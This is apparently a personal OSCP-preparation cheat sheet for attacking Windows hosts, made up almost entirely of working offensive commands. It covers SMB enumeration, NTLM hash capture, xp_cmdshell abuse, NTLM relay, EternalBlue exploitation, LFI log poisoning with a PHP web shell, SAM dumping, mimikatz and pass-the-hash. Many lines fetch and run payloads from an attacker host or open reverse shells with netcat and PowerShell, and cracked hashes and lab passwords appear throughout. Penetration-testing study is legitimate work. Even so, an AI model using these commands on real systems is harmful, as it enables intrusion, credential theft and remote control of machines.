# OSCP Cheat Sheets Windows
Preparation for OSCP

https://gist.github.com/m8r0wn/b6654989035af20a1cb777b61fbc29bf \
https://0xsp.com/offensive/privilege-escalation-cheatsheet

## RECON


### SMB
https://www.hackingarticles.in/a-little-guide-to-smb-enumeration/ \
https://github.com/m8r0wn/nullinux

```console
nmblookup -A 192.168.76.40
nbtscan 192.168.76.40
nmap --script smb-vuln* 192.168.76.40
```
```console
nmap -Pn -sT -n --script smb-enum-shares.nse  10.10.10.40 -p 135,139,445
```
```console
smbclient -L 192.168.120.140 -U " "%" " # nullsesion
smbclient -L 10.10.10.40 -U <users>%<pwd> 2>/dev/null 
smbclient -m SMB2 -L 10.10.10.40 -N 
smbclient //10.10.10.40/Users -N

# Enumerate files
smbclient -L 10.10.10.125 -N 2>/dev/null | grep "Disk" | awk '{print $1}' | while read shared; do echo "${shared} - "; smbclient -N //10.10.10.125/${shared} -c 'dir'; echo; done 
```
```console
smbmap -H 10.10.10.40 -u ''
smbmap -H 10.10.10.40 -u 'Guest'
```
```Shell
# Enumerate files
mkdir smbFolder
mount -t cifs //10.10.10.40/SYSVOL /tmp/smbFolder -o username=null,password=null,domain=WORKGROUP,rw
mount -t cifs "//10.10.10.103/Department Shares" folder  -o vers=2.1
#vers=1.0, vers=2.0, vers=2.1, vers=3.0
df -k -F cifs
tree # view files

find . -type d | while read dir; do touch ${dir}/jenriquez 2>/dev/null && echo "${dir}" && rm ${dir}/jenriquez; mkdir ${dir}/jenriquez 2>/dev/null && echo "${dir}" && rmdir ${dir}/jenriquez; done 

find . -type f | xargs file | grep -v 'cannot'
smbmap -d carpeta -H 10.10.10.100 -R FolderShared -A download.txt

watch -d "ls /mnt/folder/public/*; /mnt/folder/otro*"
```
Net-NTLM with SCF \
https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/ \
https://www.securify.nl/en/blog/living-off-the-land-stealing-netntlm-hashes/
```Shell
nano public/file.scf
[Shell]
Command=2
IconFile=\\X.X.X.X\folder\jenriquez
```
Net-NTLM with InternetShortcut \
https://insert-script.blogspot.com/2018/08/leaking-environment-variables-in_20.html
```Shell
┌──(root💀kali)-[/OSCPv3/offsec_pg/Vault]
└─# responder -v -I tun0                                                                                                                                                       

┌──(root💀kali)-[/OSCPv3/offsec_pg/Vault/DocumentsShare]
└─# cat internetShortcut.url
[InternetShortcut]
URL=whatever
WorkingDirectory=anything
IconFile=\\192.168.49.102\%USERNAME%.ico
IconIndex=1
```
Permisos
```Shell
# Permissions
smbcacls //10.10.10.40/Users Admin/Desktop -N
smbcacls //10.10.10.40/Users Admin/Desktop -N | grep Everyone
smbcacls //10.10.10.40/Users domain.local -U 'user%pwd'
smbcacls //10.10.10.40/Users domain.local/folderdir -U 'user%pwd'
```
Download files 
```Shell
# Permissions
smbclient -L //192.168.120.140/folder -N
>recurse ON
>prompt OFF
>mget *
```

### rpcclient
```Shell
rpcclient -U "" 10.10.10.52 #null session
enumdomusers

rpcclient -U "James%J@m3s_P@ssW0rd\!" 10.10.10.52 -c "enumdomusers"

# Enumerate users
rpcclient -U "James%J@m3s_P@ssW0rd\!" 10.10.10.52 -c "enumdomusers" | grep -oP '\[.*?\]' | grep '0x' | tr -d '[]' | while read rid; do rpcclient -U "James%J@m3s_P@ssW0rd\!" 10.10.10.52 -c "queryuser $rid" | grep -i "User Name"; done

rpcclient -U "James%J@m3s_P@ssW0rd\!" 10.10.10.52 -c "enumdomgroups"  # grupos
rpcclient -U "James%J@m3s_P@ssW0rd\!" 10.10.10.52 -c "querygroupmem 0x200"  #miembros del grupo x
rpcclient -U "James%J@m3s_P@ssW0rd\!" 10.10.10.52 -c "queryuser 0x200"  # usuario
```
```Shell
echo "hexhexhehx" | xxd -ps -r 
```

### Transer file

```Shell
root@kali:/OSCPv3/htb/Optimum# python -m SimpleHTTPServer 80
PS C:\Users\kostas\Desktop> certutil.exe -f -urlcache -split http://10.10.14.2/bfill.exe bfill.exe
```
```Shell
root@kali:/OSCPv3/htb/Optimum# python -m SimpleHTTPServer 80
C:\Users\kostas\Desktop>powershell -c "(New-Object Net.WebClient).DownloadFile('http://10.10.14.2/bfill.exe','C:\Users\kostas\Desktop\bfill-2.exe')"
```
```Shell
root@kali:/OSCPv3/htb/Optimum# python -m SimpleHTTPServer 80
powershell Invoke-WebRequest "http://10.10.14.2/bfill.exe" -OutFile "C:\Users\kostas\Desktop\bfill-3.exe"
```
```Shell
root@kali:/OSCPv3/htb/Optimum# impacket-smbserver folder $(pwd)
copy \\10.10.14.2\folder\bfill.exe C:\Users\kostas\Desktop\exploit.exe

root@kali:/OSCPv3/htb/Optimum# impacket-smbserver folder $(pwd) -smb2support -username <user> -password <pwd>
net use \\10.10.14.2\folder /u:<user> <pwd>
dir \\10.10.14.2\folder
copy file.txt \\10.10.14.2\folder\file.txt

#C:\Users\kostas\Desktop>powershell -exec Bypass -C "New-PSDrive -Name 'SharedFolder' -PSProvider 'FileSystem' -Root '\\10.10.14.2\folder'"
#C:\Users\kostas\Desktop>copy SharedFolder:\bfill.exe C:\Users\kostas\Desktop\exploit.exe

#HTTP
certutil.exe -urlcache -split -f "http://192.168.49.68/evil.exe" "C:\Backup\evil.exe"
```

## Vulnerability Discovery

```Shell
nmap -Pn -sT -n --script "vuln and safe" 10.10.10.40 -p 135,139,445
```
```Shell
searchsploit eternalblue
searchsploit -x 42315
searchsploit -m 42315
```

## Explotation

### RDP
```Shell
xfreerdp /u:dc /p:pwd /w:1000 /h:700 /v:192.168.100.20 +clipboard
xfreerdp /d:yuncorp.local /u:Administrator /p:P@\$\$w0rd\! /w:1000 /h:700 /v:192.168.100.20 +clipboard
```

### Firewall
```Shell
netsh advfirewall firewall add rule name="SMB" protocol=TCP dir=in localport=445 action=allow
netsh advfirewall firewall add rule name="SMB" protocol=TCP dir=out localport=445 action=allow
```

```Shell
grep -r "cpassword" . 2>/dev/null
```

### Responder
```Shell
responder -I tun0 
```
#Inveigh  - Responder Windows version \
https://github.com/Kevin-Robertson/Inveigh.git


### SQL
```Shell
sqsh -S 10.10.10.125 -U 'sa'
```

```Shell
/usr/share/doc/python-impacket/examples/mssqlclient.py WORKGROUP/reporting:PcwTWTHRwryjc\$c6@10.10.10.125 -db volume  -windows-auth
SQL> SP_CONFIGURE "show advanced options", 1
SQL> reconfigure
SQL> SP_CONFIGURE "xp_cmdshell", 1
SQL> reconfigure
SQL> xp_cmdshell "whoami"
# Get shell
SQL> xp_cmdshell "powershell Invoke-WebRequest http://10.10.14.7/nc.exe -o C:\Windows\Temp\nc.exe"
SQL> xp_cmdshell "start /b C:\Windows\Temp\nc.exe -e cmd.exe 10.10.14.7 443"
```

```shell
# Capture hash 
SQL> xp_dirtree '\\10.10.14.7\algo'
mssql-svc::QUERIER:5890d2ad2897e641:347A0136C3E30308B159CC3CA9B94AB0:01010000000000008070AE33E608D8015E3FB7F6F0A5952C00000000020008004600540048004D0001001E00570049004E002D00570059004E004100370043004400340034004800520004003400570049004E002D00570059004E00410037004300440034003400480052002E004600540048004D002E004C004F00430041004C00030014004600540048004D002E004C004F00430041004C00050014004600540048004D002E004C004F00430041004C00070008008070AE33E608D8010600040002000000080030003000000000000000000000000030000053744682CCB052C3C439A4E4224A65E6F6EA26598195450C9A37C27CAB683EA90A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00310030002E00310034002E003700000000000000000000000000
john --wordlist=rockyou.txt hash.txt
hashcat -m 5600 mssql-svc.netntlmv2 rockyou.txt -o cracked.txt --force
```

```Shell
# Enumerate tables
>SELECT TABLE_NAME FROM <database>.INFORMATION_SCHEMA.TABLES WHERE TABLE_TYPE = 'BASE TABLE';
>go
>go -m cvs > output.cvs
>go -m html > output.html
>USE <database>:
>go
```

### SMB relay
```Shell
responder -I tun0 
responder -I tun0 -rdw
\\SQLServer\hola
john --wordlist=rockyou.txt hash.txt
hashcat -m 5600 mssql-svc.netntlmv2 rockyou.txt -o cracked.txt --force
```

### SMB ntlmrelayx - SMB signing:false
```Shell
# nano /etc/responder/Responder.conf
# Off SMB
responder -I tun0 -rdw
impacket-ntlmrelayx  -tf target.txt -smb2support
# get hash NTLM
impacket-ntlmrelayx  -tf target.txt -smb2support -c "powershell IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.2/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.2 -Port 443"
\\SQLServer\hola
```

### SMB IPv6
```Shell
mitm6 -d yuncorp.local
```
NTLM \
https://book.hacktricks.xyz/windows/ntlm/places-to-steal-ntlm-creds


### Shells

```Shell
https://github.com/Hackplayers/evil-winrm
#Winrm
ruby /opt/evil-winrm/evil-winrm.rb -i 192.168.76.152 -u scripting -p 'FriendsDontLetFriendsBase64Passwords' -s /opt/tools
```
```Shell
# impacket-smbserver folder $(pwd)   
start /b \\10.10.14.7\folder\nc.exe -e cmd 10.10.14.7 443
# nc -lvnp 443
```
```Shell
root@kali:/OSCPv3/htb/Optimum# python -m SimpleHTTPServer 80
10.10.10.8 - - [12/Jan/2022 21:58:35] "GET /Invoke-PowerShellTcp.ps1 HTTP/1.1" 200 -
```
```Shell
powershell.exe -exec Bypass -C "IEX(New-Object Net.WebClient).DownloadString('http://192.168.100.17/powercat.ps1');powercat -c 192.168.100.17 -p 443 -e cmd"

C:\Users\kostas\Desktop>start /b C:\windows\SysNative\WindowsPowershell\v1.0\powershell.exe -exec Bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.2/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.2 -Port 443"
C:\windows\SysNative\WindowsPowershell\v1.0\powershell.exe -exec Bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.2/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.2 -Port 443"
```
```Shell
PS C:\> [Environment]::Is64BitOperatingSystem
PS C:\> [Environment]::Is64BitProcess

Get-ExecutionPolicy
PowerShell.exe -ExecutionPolicy Bypass -File .runme.ps1
PowerShell.exe -ExecutionPolicy UnRestricted -File .runme
Set-ExecutionPolicy Bypass -Scope Process

$ExecutionContext.SessionState.LanguageMode
```

### Crack
https://www.onlinehashcrack.com/tools-pdf-hash-extractor.php

```Shell
perl /usr/share/john/pdf2john-3.pl Infrastructure.pdf
john --wordlist=/usr/share/wordlists/rockyou.txt hash
```
```Shell
# Hast NetNTLM
root@kali:/OSCPv3/htb/Optimum# cat hash 
kostas::OPTIMUM:4141414141414141:cb75e848816d72f0887c979360a94c8d:01010000000000008049ffc23c08d801d13ac8046c9c0773000000000100100062004f0056006c004c006300560043000200100053005100730044004600540044004f000300100062004f0056006c004c006300560043000400100053005100730044004600540044004f00070008008049ffc23c08d80106000400020000000800300030000000000000000000000000200000427ee1a135839f2e7cdb03560c68c4af3fd234632cc4c0ce7480b21dc9de2fb40a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e00310034002e003200000000000000000000000000
```
```Shell
root@kali:/OSCPv3/htb/Optimum# john --wordlist=pwd.txt hash_impacket_smb 
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/32])
Press 'q' or Ctrl-C to abort, almost any other key for status
kdeEjDowkS*      (kostas)
1g 0:00:00:00 DONE (2022-01-12 23:21) 100.0g/s 100.0p/s 100.0c/s 100.0C/s kdeEjDowkS*
Use the "--show" option to display all of the cracked passwords reliably
Session completed

hashcat -O -m 5600 -a 0 -r /usr/share/hashcat/rules/best64.rule -o crack.txt hash.txt /usr/share/wordlists/rockyou.txt
```

### Exploits

```Shell
curl -s -X POST -d '' 'http://192.168.112.99:33333/list-running-procs' | head
```

#### WebDAV IIS 6
```Shell
cadaver 10.10.10.15 
dav:/> put cmd.txt
dav:/> move cmd.txt cmd.aspx
```
```Shell
# davtest -url http://10.10.10.15
# davtest -url http://192.168.102.127:8000/imagefs/ab367e7961f629bc/images/
```

#### LFI / RFI
https://notchxor.github.io/oscp-notes/2-web/LFI-RFI/

```Shell
wfuzz -c -t 500 --hc=404 --hw=35,41,32,39 -w paths.txt http://192.168.142.53:4443/site/index.php?page=FUZZ
curl -s 'http://192.168.142.53:4443/site/index.php?page=C:\xampp\apache\logs\access.log' | head
curl -A "<?php echo '<pre>' . shell_exec(\$_GET['cmd'])  . '</pre>'; ?>" -s 'http://192.168.142.53:4443/site/index.php?page=C:\xampp\apache\logs\access.log'
```
```Shell
curl -A "exploting LFI" -s 'http://192.168.142.53:4443/site/index.php?page=C:\xampp\apache\logs\access.log&cmd=type%20..\..\passwords.txt' | grep \<pre\> -A 40
```
```Shell
impacket-smbserver folder . -smb2support
curl -A "exploting LFI" -s 'http://192.168.142.53:4443/site/index.php?page=C:\xampp\apache\logs\access.log&cmd=\\192.168.49.142\folder\nc.exe%20%2de%20cmd%2092.168.49.142%2080' | grep \<pre\> 
```
```Shell
C:\Apache\conf\httpd.conf
C:\Apache\logs\access.log
C:\Apache\logs\error.log
C:\Apache2\conf\httpd.conf
C:\Apache2\logs\access.log
C:\Apache2\logs\error.log
C:\Apache22\conf\httpd.conf
C:\Apache22\logs\access.log
C:\Apache22\logs\error.log
C:\Apache24\conf\httpd.conf
C:\Apache24\logs\access.log
C:\Apache24\logs\error.log
C:\Documents and Settings\Administrator\NTUser.dat
C:\php\php.ini
C:\php4\php.ini
C:\php5\php.ini
C:\php7\php.ini
C:\Program Files (x86)\Apache Group\Apache\conf\httpd.conf
C:\Program Files (x86)\Apache Group\Apache\logs\access.log
C:\Program Files (x86)\Apache Group\Apache\logs\error.log
C:\Program Files (x86)\Apache Group\Apache2\conf\httpd.conf
C:\Program Files (x86)\Apache Group\Apache2\logs\access.log
C:\Program Files (x86)\Apache Group\Apache2\logs\error.log
c:\Program Files (x86)\php\php.ini
C:\Program Files\Apache Group\Apache\conf\httpd.conf
C:\Program Files\Apache Group\Apache\conf\logs\access.log
C:\Program Files\Apache Group\Apache\conf\logs\error.log
C:\Program Files\Apache Group\Apache2\conf\httpd.conf
C:\Program Files\Apache Group\Apache2\conf\logs\access.log
C:\Program Files\Apache Group\Apache2\conf\logs\error.log
C:\Program Files\FileZilla Server\FileZilla Server.xml
C:\Program Files\MySQL\my.cnf
C:\Program Files\MySQL\my.ini
C:\Program Files\MySQL\MySQL Server 5.0\my.cnf
C:\Program Files\MySQL\MySQL Server 5.0\my.ini
C:\Program Files\MySQL\MySQL Server 5.1\my.cnf
C:\Program Files\MySQL\MySQL Server 5.1\my.ini
C:\Program Files\MySQL\MySQL Server 5.5\my.cnf
C:\Program Files\MySQL\MySQL Server 5.5\my.ini
C:\Program Files\MySQL\MySQL Server 5.6\my.cnf
C:\Program Files\MySQL\MySQL Server 5.6\my.ini
C:\Program Files\MySQL\MySQL Server 5.7\my.cnf
C:\Program Files\MySQL\MySQL Server 5.7\my.ini
C:\Program Files\php\php.ini
C:\Users\Administrator\NTUser.dat
C:\Windows\debug\NetSetup.LOG
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\Panther\Unattended.xml
C:\Windows\php.ini
C:\Windows\repair\SAM
C:\Windows\repair\system
C:\Windows\System32\config\AppEvent.evt
C:\Windows\System32\config\RegBack\SAM
C:\Windows\System32\config\RegBack\system
C:\Windows\System32\config\SAM
C:\Windows\System32\config\SecEvent.evt
C:\Windows\System32\config\SysEvent.evt
C:\Windows\System32\config\SYSTEM
C:\Windows\System32\drivers\etc\hosts
C:\Windows\System32\winevt\Logs\Application.evtx
C:\Windows\System32\winevt\Logs\Security.evtx
C:\Windows\System32\winevt\Logs\System.evtx
C:\Windows\win.ini
C:\xampp\apache\conf\extra\httpd-xampp.conf
C:\xampp\apache\conf\httpd.conf
C:\xampp\apache\logs\access.log
C:\xampp\apache\logs\error.log
C:\xampp\FileZillaFTP\FileZilla Server.xml
C:\xampp\MercuryMail\MERCURY.INI
C:\xampp\mysql\bin\my.ini
C:\xampp\php\php.ini
C:\xampp\security\webdav.htpasswd
C:\xampp\sendmail\sendmail.ini
C:\xampp\tomcat\conf\server.xml
```

#### Eternalblue
```Shell
wget https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/42315.py -O mysmb.py
python 42315.py 10.10.10.40
```
```Shell
msfvenom -p windows/x64/shell_reverse_tcp -f exe -o exploit.exe EXITFUNC=thread LHOST=10.10.14.28 LPORT=4444
python 42315.py 10.10.10.40 samr exploit.exe 
```
```Shell
git clone https://github.com/3ndG4me/AutoBlue-MS17-010.git
python eternal_checker.py 10.10.10.40

./shell_prep.sh 
python eternalblue_exploit7.py 10.10.10.40 sc_x64.bin 

msfvenom -p windows/x64/shell_reverse_tcp -f raw -o sc_x64_msf.bin EXITFUNC=thread LHOST=10.10.14.28 LPORT=4444
python eternalblue_exploit7.py 10.10.10.40 sc_x64_msf.bin
```
https://github.com/worawit/MS17-010.git
```Shell
python checker.py 127.0.0.1
python zzz_exploit.py 127.0.0.1 samr
```
https://www.exploit-db.com/exploits/42031
```Shell
python 42031.py 192.168.76.40 MS17-010/sc_x86_msf.bin
```

#### MS09_050 RCE SMB2 
https://www.exploit-db.com/exploits/40280

https://raw.githubusercontent.com/ohnozzy/Exploit/master/MS09_050.py

python MS09_050.py 192.168.76.40

#### CVE2009-2585 - HP Power Manager 4.2
https://raw.githubusercontent.com/Muhammd/HP-Power-Manager/master/hpm_exploit.py


## Post Explotation
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md

### Windows Users
```Shell
net users
net user admin admin /add
net localgroup administrators
net localgroup administrators admin /add
net localgroup "Remote Desktop Users" admin /add
```

### Crackmapexec
```Shell
crackmapexec smb 10.10.10.40 -u 'admin' -p 'admin' cmd /c reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
crackmapexec smb 10.10.10.40 -u 'admin' -p 'admin' -x 'whoami'
crackmapexec smb 10.10.10.40 -u 'admin' -p 'admin' --sam
crackmapexec smb 10.10.10.40 -u 'admin' -p 'admin' --local-auth --wdigest enable
crackmapexec smb 10.10.10.40 -u 'admin' -p 'admin' --rid-brute
crackmapexec smb 10.10.10.40 -u 'admin' -p 'admin' -M rdp -o action=enable # activate rdp
crackmapexec smb 10.10.10.40 -u 'Administrator' -H cdf51b162460b7d5bc898f493751a0cc -x 'whoami'
crackmapexec smb 10.10.10.40 -u 'Administrator' -H cdf51b162460b7d5bc898f493751a0cc -M mimikatz -o COMMAND="privilege::debug token::elevate sekurlsa::logonpasswords exit"
crackmapexec smb 10.10.10.40 -u 'admin' -p 'kdeEjDowkS*' -x '\\10.10.14.2\smbfolder\nc.exe -e cmd 10.10.14.2 4444'
```

### Windows SAM
```Shell
reg save HKLM\SAM sam.backup
reg save HKLM\SYSTEM system.backup

impacket-smbserver smbfolder $(pwd)
copy sam.backup \\10.10.14.28\smbfolder\sam
copy system.backup \\10.10.14.28\smbfolder\system

pwdump system sam 
```

### Windows psexec
```Shell
#reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
#user with admin priv
python /opt/impacket/examples/psexec.py WORKGROUP/admin:admin\@10.10.10.40 cmd.exe
python /usr/share/doc/python-impacket/examples/psexec.py WORKGROUP/kostas:kdeEjDowkS*@10.10.10.8 cmd.exe
```

### Windows wmiexec
```Shell
impacket-wmiexec 'administrator:MyUnclesAreMarioAndLuigi!!1!@10.10.10.125'
```


### Pass-The-Hash
```Shell
pth-winexe -U WORKGROUP/Administrator%aad3b435b51404eeaad3b435b51404ee:d90b270062e8b9f118ab8e0f733df391 //10.10.10.8 cmd.exe
```

### PortForwarding
```Shell
impacket-smbserver folder $(pwd) 
copy \\10.10.14.7\folder\plink.exe plink.exe
plink.exe -P 445 -l root -pw <pwd> -R 4445:127.0.0.1:445 10.10.14.7
#sshd_config
KexAlgorithms +diffie-hellman-group1-sha1
Ciphers +aes128-cbc
```


## Priv
https://github.com/SecWiki/windows-kernel-exploits \
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md

#PowerUp.ps1
```Shell
powershell
PS C:\> Set-ExecutionPolicy Unrestricted
PS C:\Users\kostas\Desktop> IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.2/PowerUp.ps1');Invoke-AllChecks;
PS C:\Users\kostas\Desktop> Import-Module ./PowerUp.ps1
PS C:\Users\kostas\Desktop> Invoke-AllChecks | Out-File -Encoding ASCII PowerUp.txt
```
#Wesng
https://github.com/bitsadmin/wesng
```Shell
root@kali:/OSCPv3/htb/Optimum# python /opt/wesng/wes.py systeminfo.txt
root@kali:/OSCPv3/htb/Optimum# python /opt/wesng/wes.py systeminfo.txt -i "Elevation Privilege"
``` 

#Windows-Exploit-Suggester
https://github.com/AonCyberLabs/Windows-Exploit-Suggester
```Shell
root@kali:/OSCPv3/htb/Optimum# python windows-exploit-suggester.py --update
root@kali:/OSCPv3/htb/Optimum# python windows-exploit-suggester.py --database 2022-01-12-mssb.xls  --systeminfo systeminfo.txt
```

### Modifiable Service Abuse
#Enumerates all services and returns services for which the current user can modify the binPath
```Shell
powershell
PS C:\> Set-ExecutionPolicy Unrestricted
Import-Module .\Powerup.ps1
Invoke-ServiceAbuse -Name 'UsoSvc' -Command "C:\Windows\Temp\nc.exe -e cmd 10.10.14.7 443"
```

#Enumerates the paths stored in Env:Path (%PATH) and filters each through Get-ModifiablePath to return the folder paths the current user can write to
```Shell
powershell
PS C:\> Set-ExecutionPolicy Unrestricted
Import-Module .\Powerup.ps1
Find-PathDLLHijack
```

### Task
```Shell
schtasks /query /fo LIST /v | select-string 'TFTP' -context 10 
```

### Weak services
```Shell
sc qc bd
icacls bd.exe
# (RX) or (F) or everyone
whoami /priv
shutdown -r
```

### Group policy preferences
https://adsecurity.org/?p=2288
findstr /S /I cpassword \\<FQDN>\sysvol\<FQDN>\policies\*.xml
https://raw.githubusercontent.com/BustedSec/gpp-decrypt/master/gpp-decrypt.rb
```Shell
ruby gpp-decrypt.rb
```

### Exploits

#### MS16-098 - CVE-2016-3309 - Microsoft Windows 8.1 (x64) - 'RGNOBJ' Integer Overflow
https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS16-098/bfill.exe

#### MS16-032 - CVE-2016-0099 - Microsoft Windows 7 < 10 / 2008 < 2012 R2 (x86/x64)
https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-032
